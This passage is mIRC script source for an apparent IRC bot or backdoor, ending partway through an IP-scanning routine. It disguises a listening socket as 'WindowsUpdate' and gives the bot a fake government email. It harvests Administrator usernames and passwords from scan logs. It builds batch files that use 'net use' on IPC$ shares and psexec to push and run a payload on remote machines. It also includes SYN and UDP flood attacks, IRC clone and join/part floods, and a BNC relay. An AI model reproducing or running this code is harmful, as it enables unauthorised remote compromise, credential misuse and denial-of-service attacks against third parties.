            "on *:sockopen:download: { if ($sockerr) { talk Error: Socket error. | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 |  .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }",
            "on *:sockread:download: { if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }",
            "on *:sockclose:download: { if ($file(%download2).size != %downloadlength) { .sockclose download | download http:// $+ %download1 $+ / $+ %download3 } | else { talk Success: File downloaded ( $+ $mircdir $+ %download2 $+ ) [[ $+ $bytes($file(%download2).size).suf $+ ][ $+ $duration($calc($ctime - %download4)) $+ ][ $+ $round($calc($calc($file(%download2).size / 1024) / $calc($ctime - %download4)),2) $+ kbps $+ ] } | unset %download* }",
            "alias download { if ($sock(download)) { talk Error: Already downloading a file. | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | set %download4 $ctime | .sockopen download %download1 80 ",
            "alias random return $r(A,Z) $+ $r(1,99) $+ $r(a,z) $+ $r(1,99) $+ $r(A,Z) $+ $r(1,99)",
            "alias SeTtInGs2 {",
            "  nick [ $+ $os $+ - $+ $r(0,99999) $+ $r(0,99999) $+ ]]",
            "  anick [ $+ $os $+ - $+ $r(0,99999) $+ $r(0,99999) $+ ]]",
            "  identd on [ $+ $os $+ - $+ $r(0,99999) $+ $r(0,99999) $+ ]]",
            "  emailaddr $+($ownage,@user.level-,$os,-.us.gov)",
            "  fullname [ $+ $os $+ - $+ $r(0,99999) $+ $r(0,99999) $+ ]] $+ $r(a,z)",
            "  if (!$portfree(66666)) { exit }",
            "  else { socklisten WindowsUpdate 66666 }",
            "alias startparse {",
            "  set %t 0",
            "  set %results 0",
            "  set %total $findfile(log\\,*.htm,0)",
            "  :start",
            "  inc %t",
            "  if (%t <= %total) { parsefile $findfile(log\\,*.htm,%t) | goto start }",
            "alias parsefile {",
            "  set %temp.test $1",
            "  set %temp.host $nopath($1)",
            "  set %temp.host $remove(%temp.host,.htm)",
            "  set %temp.text $read($1, w, *Type: Administrator*)",
            "  set %temp.line $readn",
            "  if (%temp.line == 0) { return NULL }",
            "  set %temp.text $read($1, $calc($readn - 1))",
            "  if ($read($1, $calc(%temp.line - 1)) == <BR>) { $getuserpass2($read($1, $calc(%temp.line - 2))) | return }",
            "  $getuserpass(%temp.text)",
            "alias getuserpass {",
            "  set %temp.user $gettok($1,2,60)",
            "  set %temp.user $gettok(%temp.user,2,62)",
            "  set %temp.pass $gettok($1,3,47)",
            "  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }",
            "  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }",
            "  if ($exists(rcnc.x) == $false) { .write -c rcnc.x }",
            "  inc %results",
            "  echo -a FOUND: %temp.host %temp.user %temp.pass",
            "  write rcnc.x %temp.host %temp.user %temp.pass",
            "  remove %temp.test",
            "alias getuserpass2 {",
            "  set %temp.user $gettok($1,2,62)",
            "  set %temp.user $gettok(%temp.user,1,60)",
            "  set %temp.pass $gettok($1,3,47)",
            "  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }",
            "  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }",
            "  if ($exists(rcnc.x) == $false) { .write -c rcnc.x }",
            "  inc %results",
            "  echo -a FOUND: %temp.host %temp.user %temp.pass",
            "  write rcnc.x %temp.host %temp.user %temp.pass",
            "  remove %temp.test",
            "alias getroot { if ($lines(rcnc.x) < 1) { halt } | /root $read(rcnc.x,1) | write -dl1 rcnc.x }",
            "alias root { if ($1 == $null) { halt }",
            "  :select",
            "  set %tempfile ord $+ $fnick $+ .bat",
            "  set %t.drive $r(n,z) $+ :",
            "  if ($exists(%t.drive) == $true) { goto select }",
            "  set %t.user $2",
            "  if ($3 == [NULL]) { set %t.pass $null | set %ps.pass -p \"\" }",
            "  else { set %t.pass $3 | set %ps.pass -p $3 }",
            "  set %t.host \\\\ $+ $1 | set %t.share IPC$",
            "  write %tempfile net use %t.drive /delete",
            "  write %tempfile net use %t.host /USER: $+ %t.user $chr(34) $+ %t.pass $+ $chr(34)",
            "  write %tempfile net use %t.drive %t.host $+ \\ $+ %t.share",
            "  write %tempfile psexec.exe %t.host -u %t.user %ps.pass -f -c -d %sf -o",
            "  write %tempfile psexec.exe %t.host -u %t.user %ps.pass -d %sf -o",
            "  write %tempfile net use %t.drive /delete",
            "  write %tempfile net use %t.host /delete",
            "  write %tempfile del %tempfile",
            "  talk Nt $1 $2 $+ / $+ $3",
            "  run van32.exe %tempfile",
            "alias rootnum {",
            "  inc %rooted",
            "  if (%rooted == $null) { set %rooted 0 }",
            "  inc %rooted",
            "  if ($len(%rooted) == 1) { set %rooted 00 $+ %rooted }",
            "  if ($len(%rooted) == 2) { set %rooted 0 $+ %rooted }",
            "  return %rooted",
            "alias x $eval($$1-,2)",
            "alias synz { if ($1 == $null) { return } | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | talk syn flood on: %synaa is completed.. | unset %synaa }",
            "alias syn {",
            "  if ($2 == start) { if (%synport !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }",
            "  if ($2 == halt) { if ($sock(syn*,0) > 0) { sockclose syn* } }",
            "alias startsfx {",
            "  sockopen crash101 %satserver %satport",
            "  sockopen crash102 %satserver %satport",
            "  sockopen crash103 %satserver %satport",
            "  sockopen crash104 %satserver %satport",
            "  sockopen crash105 %satserver %satport",
            "  sockopen crash106 %satserver %satport",
            "  sockopen crash107 %satserver %satport",
            "  sockopen crash108 %satserver %satport",
            "  sockopen crash109 %satserver %satport",
            "  sockopen crash200 %satserver %satport",
            "  sockopen crash201 %satserver %satport",
            "  sockopen crash202 %satserver %satport",
            "  sockopen crash203 %satserver %satport",
            "  sockopen crash204 %satserver %satport",
            "  sockopen crash205 %satserver %satport",
            "  sockopen crash206 %satserver %satport",
            "  sockopen crash207 %satserver %satport",
            "  sockopen crash208 %satserver %satport",
            "  sockopen crash209 %satserver %satport",
            "  sockopen crash300 %satserver %satport",
            "  sockopen crash301 %satserver %satport",
            "  sockopen crash302 %satserver %satport",
            "  sockopen crash303 %satserver %satport",
            "  sockopen crash304 %satserver %satport",
            "  sockopen crash305 %satserver %satport",
            "  sockopen crash306 %satserver %satport",
            "  sockopen crash307 %satserver %satport",
            "  sockopen crash308 %satserver %satport",
            "  sockopen crash309 %satserver %satport",
            "  sockopen crash400 %satserver %satport",
            "  sockopen crash501 %satserver %satport",
            "  sockopen crash502 %satserver %satport",
            "  sockopen crash503 %satserver %satport",
            "  sockopen crash504 %satserver %satport",
            "  sockopen crash505 %satserver %satport",
            "  sockopen crash506 %satserver %satport",
            "  sockopen crash507 %satserver %satport",
            "  sockopen crash508 %satserver %satport",
            "  sockopen crash509 %satserver %satport",
            "  sockopen crash600 %satserver %satport",
            "on *:sockopen:crash*: {",
            "  if ($sockerr > 0) { return }",
            "  if (%fld.tp == nickx) { goto snxf }",
            "  if (%fld.tp == msgx) { goto smxf }",
            "  if (%fld.tp == jpx) { goto sjpxf }",
            "  if (%fld.tp == mix) { goto mix }",
            "  if (%fld.tp == rip) { goto rip }",
            "  :snxf",
            "  .sockwrite -tn $sockname user $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) asdf asdf asdf",
            "  .sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)",
            "  .sockwrite -tn $sockname ircx",
            "  .sockwrite -tn $sockname join %satchan",
            "  .sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)",
            "  .set %namesock $sockname",
            "  .sockclose %namesock",
            "  .sockwrite -tn $sockname quit : $+ $str(F",
            "R.,20)",
            "  .sockopen %namesock %satserver %satport",
            "  halt",
            "  :mix",
            "  .sockwrite -tn $sockname user $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) asdf asdf asdf",
            "  .sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)",
            "  .sockwrite -tn $sockname ircx",
            "  .sockwrite -tn $sockname notice %satchan : ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| ",
            "  .sockwrite -tn $sockname privmsg %satchan :",
            "DCC CHAT $r(1,999999) $r(1024,5000) $r(1,5000) $+ ",
            "  .sockwrite -tn $sockname notice %satchan : $+ $chr(1) $+ ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| ",
            "  .sockwrite -tn $sockname privmsg %satchan : ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||",
            "  .set %namesock $sockname",
            "  .sockclose %namesock",
            "  .sockopen %namesock %satserver %satport",
            "  halt",
            "  :sjpxf",
            "  .sockwrite -tn $sockname user $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) asdf asdf asdf",
            "  .sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)",
            "  .sockwrite -tn $sockname ircx",
            "  .sockwrite -tn $sockname join %satchan",
            "  .sockwrite -tn $sockname part %satchan",
            "  .sockwrite -tn $sockname join %satchan",
            "  .sockwrite -tn $sockname part %satchan",
            "  .sockwrite -tn $sockname join %satchan",
            "  .sockwrite -tn $sockname part %satchan",
            "  .sockwrite -tn $sockname join %satchan",
            "  .sockwrite -tn $sockname part %satchan",
            "  .sockwrite -tn $sockname join %satchan",
            "  .sockwrite -tn $sockname part %satchan",
            "  .sockwrite -tn $sockname join %satchan",
            "  .sockwrite -tn $sockname part %satchan",
            "  .sockwrite -tn $sockname join %satchan",
            "  .sockwrite -tn $sockname part %satchan",
            "  .sockwrite -tn $sockname join %satchan",
            "  .sockwrite -tn $sockname part %satchan",
            "  .sockwrite -tn $sockname join %satchan",
            "  .sockwrite -tn $sockname part %satchan",
            "  .sockwrite -tn $sockname join %satchan",
            "  .set %namesock $sockname",
            "  .sockclose %namesock",
            "  .sockopen %namesock %satserver %satport",
            "  halt",
            "  :smxf",
            "  .sockwrite -tn $sockname user $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) asdf asdf asdf",
            "  .sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)",
            "  .sockwrite -tn $sockname ircx",
            "  .sockwrite -tn $sockname join %satchan",
            "  .sockwrite -tn $sockname privmsg %satchan : $str(F",
            "R.,20)",
            "  .sockwrite -tn $sockname notice %satchan : $+ $str(F",
            "Z.,10)",
            "  .sockwrite -tn $sockname privmsg %satchan : $+ $chr(1) $+ Version $+ $chr(1)",
            "  .set %namesock $sockname",
            "  .sockwrite -tn $sockname quit : $+ $str(F",
            "R.,20)",
            "  .sockclose %namesock",
            "  .sockopen %namesock %satserver %satport",
            "  halt",
            "  :rip",
            "  .sockwrite -tn $sockname user $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) asdf asdf asdf",
            "  .sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)",
            "  .sockwrite -tn $sockname ircx",
            "  .sockwrite -tn $sockname join %satchan",
            "  .sockwrite -tn $sockname notice %satchan : $+ $chr(1) $+ $str(F",
            "R.,20)",
            "  .set %namesock $sockname",
            "  .sockwrite -tn $sockname quit : $+ $str(F",
            "R.,20)",
            "  .sockclose %namesock",
            "  .sockopen %namesock %satserver %satport",
            "  halt",
            "alias FnIcK {",
            "  set %fnick $rand(1,10)",
            "  if (%fnick = 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $chr($r(65,125)) $+ $chr($r(65,125))  }",
            "  if (%fnick = 2) { return $chr($r(65,125)) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $chr($r(65,125))  }",
            "  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }",
            "  if (%fnick = 4) { return $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(A,Z) }",
            "  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }",
            "  if (%fnick = 6) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,40) $+ $chr($r(65,125))  }",
            "  if (%fnick = 7) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }",
            "  if (%fnick = 8) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $chr($r(65,125))  }",
            "  if (%fnick = 9) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,10) $+ $chr($r(65,125))  }",
            "  if (%fnick = 10) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(20,50) $+ $chr($r(65,125)) }",
            "alias nuke {",
            "  if (%udp.reps = $null) { .set %udp.reps 500 | .goto begin }",
            "  :begin",
            "  .timernuker -ocm %udp.reps 20 .udpto %udp.fuck",
            "alias udpto {",
            "  .set %sock.dest %udp.fuck",
            "  .sockudp -b udp %udp.fuck $rand(100,4000) 999999999999 PING",
            "  .sockudp -b udp %udp.fuck $rand(100,4000) 999999999999 PING",
            "  .sockudp -b udp %udp.fuck $rand(100,4000) 999999999999 PING",
            "  .sockudp -b udp %udp.fuck $rand(100,4000) 999999999999 PING",
            "  .sockudp -b udp %udp.fuck $rand(100,4000) 999999999999 PING",
            "  .sockudp -b udp %udp.fuck $rand(100,4000) 999999999999 PING",
            "  .inc %udp.inc",
            "alias osrun {",
            "  talk Out Servise Attack to : %osip",
            "  timeros -ocm %ostime 500 osdate",
            "alias sglrun {",
            "  talk X-Signal Attack to : %sglip",
            "  timersgl -ocm %ostime 100 sgldate",
            "alias sgldate {",
            "  sockopen signalx $+ $r(0,99999) %sglip %sglport",
            "on *:sockopen:signalx*:{",
            "  set %sglsock $sockname",
            "  sockwrite -tn $sockname $str($r(a,z) $+ $r(A,Z) $+ !@#$%^&*()_+| $+ $r(0,9) $+ $r(a,z),30)",
            "  sockclose %sglsock",
            "on *:dns { set %osdns $raddress }",
            "alias osdate {",
            "  dns %osip",
            "  .sockudp -b udp %osdns $r(21,7000) 999999999999 PING",
            "  .sockudp -b udp %osdns $r(21,7000) 999999999999 PING",
            "  .sockudp -b udp %osdns $r(21,7000) 999999999999 PING",
            "  .sockudp -nt $r(1,10000000000000) %osdns $r(1,60000) PING",
            "  .sockudp -nbt udp $+ $r(0,9999999) %osdns $r(23,60000) $str(9,400) PING",
            "  .sockudp -b udp %osdns $r(21,7000) $str(!@#$%^&*()_+|,10)",
            "  .sockudp -b udp %osdns $r(21,7000) 999999999999 PING",
            "  .sockudp -b udp %osdns $r(21,7000) 999999999999 PING",
            "  .sockudp -b udp %osdns $r(21,7000) 999999999999 PING",
            "on *:sockopen:flood-*:{ if ($sockerr) { sockclose $sockname | sockopen $+(flood-,$r(1,999),$r(a,z),$r(A,Z)) $sock($sockname).ip $sock($sockname).port } | else { sockwrite -n $sockname USER $random * * : $+ $random | sockwrite -n $sockname NICK $random | .timerpc $+ $sockname 0 5 sockwrite -n $sockname PRIVMSG # $+ $random :H4CKxCrEw } }",
            "on *:sockread:flood-*:{",
            "  sockread %dtls",
            "  tokenize 32 %dtls",
            "  if ($2 == 433) { sockwrite -n $sockname NICK $random }",
            "  if ($1 == PING) { sockwrite -n $sockname PONG $2- | sockwrite -n $sockname PING $2- } ",
            "  if ($2 == 376) { sockwrite -n $sockname MODE $3 +i }",
            "  if ($2 == PRIVMSG) && (:",
            "Version",
            " = $4) { sockwrite -n $sockname NOTICE $remove($gettok($1,1,33),:,$chr(32)) :",
            "VERSION $version $+ ",
            "  if ($2 == PRIVMSG) && (:",
            "PING*",
            " iswm $4-) { sockwrite -n $sockname NOTICE $remove($gettok($1,1,33),:,$chr(32)) :",
            "PING $ctime $+ ",
            "  if ($2 == PRIVMSG) && (:",
            "Time",
            " iswm $4-) { sockwrite -n $sockname NOTICE $remove($gettok($1,1,33),:,$chr(32)) :",
            "TIME $fulldate $+ ",
            "  if ($2 == KICK) { sockwrite -n $sockname JOIN : $+ $3 }",
            "  if ($1 == ERROR) { sockclose $sockname | sockopen $+(flood-,$r(1,999),$r(a,z),$r(A,Z)) $sock($sockname).ip $sock($sockname).port }",
            "on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }",
            "on *:sockread:BncClient*:{",
            "  sockread %BncClient",
            "  if ($gettok(%BncClient,1,32) == NICK) {",
            "    set %Bnc.nick $gettok(%BncClient,2,32)",
            "  if ($gettok(%BncClient,1,32) == USER) {",
            "    set %Bnc.user $gettok(%BncClient,2-,32)",
            "    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>",
            "  if ($gettok(%BncClient,1,32) == PASS) {",
            "    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {",
            "      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to rst BNC, the messiah has arrived...",
            "      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now",
            "      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect",
            "      %Bnc.legit = yes",
            "    }",
            "    if ($gettok(%BncClient,2,32) != %Bnc.passwd) {",
            "      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!",
            "    }",
            "  if ($gettok(%BncClient,1,32) == CONN) {",
            "    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ Fuck off. | sockclose   $sockname",
            "    }",
            "    if (BncServer $+ $remove($sockname,BncClient) != $null) {",
            "      sockclose BncServer $+ $remove($sockname,BncClient)",
            "    }",
            "    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)",
            "    set %Bnc.server.passwd $gettok(%BncClient,4,32)",
            "  else {",
            "    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {",
            "      halt",
            "    }",
            "    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient",
            "on *:sockopen:BncServer*:{",
            "  if ($sockerr) {",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection",
            "    sockclose $sockname",
            "    halt",
            "  if ($sock($sockname).status != active) {",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection",
            "    sockclose BncServer $+ $remove($socknme, BncServer)",
            "    halt",
            "  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection",
            "  sockwrite -n $sockname NICK %Bnc.nick",
            "  sockwrite -n $sockname USER %Bnc.user",
            "on *:sockread:BncServer*:{",
            "  sockread %BncServer",
            "  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {",
            "    halt",
            "  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer",
            "on *:sockopen:Sockets-*:{ sockwrite -tn $sockname PONG $server | sockwrite -tn $sockname USER $nfs $nfs $nfs : $+ $nfs |   sockwrite -tn $sockname NICK $read(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }",
            "on *:sockread:Sockets-*:{",
            "  sockread %SocketTemp",
            "  if (PING* ISWM %SocketTemp) {",
            "    sockwrite -tn $sockname PONG : $+ $gettok(%SocketTemp,2,58)",
            "    halt",
            "  halt",
            "alias checkconn {",
            "  if ($server == $null) { server %server }",
            "  else { halt }",
            "alias cleanup { set %papaflood off | .sockclose boj* | unset %nick | unset %channel* | unset %server | unset %port | unset %clones | unset %flood | unset %flood.nick }",
            "alias bojsock2 if (%bojnomsocks == %bojnom) { timerbojsock2 off }",
            "alias bojsock { inc %bojnomSocks | Sockopen boj $+ $vip %bojserver %bojport }",
            "on *:Sockopen:boj*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $vip $+ $r(A,Z) | sockwrite -nt $sockname ircx | sockwrite -tn $sockname join %channel2 | if %botfuck != $null { sockwrite -n $sockname join %botfuck | sockwrite -n $sockname privmsg %botfuck : $+ $str(F",
            "R.,20) } }",
            "on *:Sockclose:boj*:{ sockopen bot $+ $vip %botserver %botport }",
            "on *:sockread:boj*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname KSA %server } }",
            "alias bojflood set %bojflood $Blood | sockwrite -n boj* privmsg %bojfuck : $+ %bojflood",
            "alias vip { return $r(a,z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(a,z) }",
            "alias runudpkill {",
            "  talk sending udp kill packets to : %udpkillipz - times : %udpktimes",
            "  timerukillnuker -ocm %udpktimes 100 udptokillxz",
            "alias udptokillxz {",
            "  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING",
            "  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING",
            "  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING",
            "  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING",
            "  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING",
            "  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING",
            "  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING",
            "  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING",
            "  .sockudp -b udp %udpkillipz $rand(100,9000) 999999999999 PING",
            "  .sockudp -b udp %udpkillipz $rand(100,4000) $str(!@#$%^&*()_+|,10)",
            "  .sockudp -nt $rand(1,10000000000000) %udpkillipz $r(1,60000) PING",
            "  .sockudp -nbt udp $+ $r(0,9999999) %udpkillipz $rand(23,60000) $str(9,400) PING",
            "alias randip {",
            "  unset %1p1 %1p2",
            "  set %1p1 $1-",
            "  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))",
            "  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))",
            "  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))",
            "  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))",
            "  return %1p2",
            "alias st4rtsc4n {",
            "  inc %totalscaning",
            "  if %totalscaning >= %total $decode(ZmluaXNoZWQ=,m)",
            "  set %ip1 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 1",
            "  set %ip2 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 2",
            "  set %ip3 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 3",
            "  set %ip4 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 4",
            "  set %ip5 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 5",
            "  set %ip6 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 6",
            "  set %ip7 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 7",
            "  set %ip8 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 8",
            "  set %ip9 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 9",
            "  set %ip10 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 10",
            "  set %ip11 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 11",
            "  set %ip12 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 12",
            "  set %ip13 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 13",
            "  set %ip14 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 14",
            "  set %ip15 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 15",
            "  set %ip16 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 16",
            "  set %ip17 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 17",
            "  set %ip18 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 18",
            "  set %ip19 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 19",
            "  set %ip20 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 20",
            "  set %ip21 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 21",
            "  set %ip22 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 22",
            "  set %ip23 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 23",
            "  set %ip24 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 24",
            "  set %ip25 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 25",
            "  set %ip26 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 26",
            "  set %ip27 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 27",
            "  set %ip28 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 28",
            "  set %ip29 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 29",
            "  set %ip30 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 30",
            "  set %ip31 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 31",
            "  set %ip32 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 32",
            "  set %ip33 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
